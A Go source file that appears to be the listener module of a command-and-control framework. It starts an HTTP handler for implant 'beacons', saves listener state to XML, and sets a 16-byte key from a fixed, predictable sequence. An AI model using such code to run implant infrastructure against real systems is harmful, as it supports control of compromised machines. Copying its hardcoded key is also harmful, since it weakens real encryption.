package main

import (
	"crypto/rand"
	"fmt"
	"net/http"
	"strings"
)

func StartListener(uri string, port int, lisname string) {

	if checkXMLExists("./Listener/", lisname+".xml") {
		var listener Listener

		ReadXML("./Listener/"+lisname+".xml", &listener)

		http.HandleFunc("/"+strings.TrimPrefix(listener.Uri, "IGOR-"), func(w http.ResponseWriter, r *http.Request) {
			Listener_Handler(w, r, &listener)
		})

		fmt.Printf("Listening on port %d: %s...\n", port, listener.Lisname)
		if err := http.ListenAndServe(fmt.Sprintf(":%d", listener.Port), nil); err != nil {
			fmt.Printf("Error starting server: %s\n", err)
		}
	} else {
		var beacons []Beacon

		listener := Listener{
			Lisname: lisname,
			Uri:     "IGOR-" + uri,
			Port:    port,
			A:       temp_a(),
			// convertToUint8("USAnmslhahahahahahahahhahahhahahaahahahaha"),
			Beacons: beacons,
		}

		saveXML("./Listener/"+lisname, &listener)

		http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
			Listener_Handler(w, r, &listener)
		})

		fmt.Printf("Listening on port %d...\n", port)
		if err := http.ListenAndServe(fmt.Sprintf(":%d", port), nil); err != nil {
			fmt.Printf("Error starting server: %s\n", err)
		}
	}

}

func convertToUint8(input string) []uint8 {
	var result []uint8

	bytes := []byte(input)

	if len(bytes) > 16 {
		bytes = bytes[:16]
	}

	for i := 0; i < 16; i++ {
		if i < len(bytes) {
			result = append(result, uint8(bytes[i]))
		} else {
			randomByte := make([]byte, 1)
			rand.Read(randomByte)
			result = append(result, uint8(randomByte[0]))
		}
	}

	return result
}

func temp_a() []uint8 {
	a := make([]uint8, 16)
	i := 0
	for i < 16 {
		a[i] = (uint8)(0x41 + i*2)
		i++
	}
	return a

}
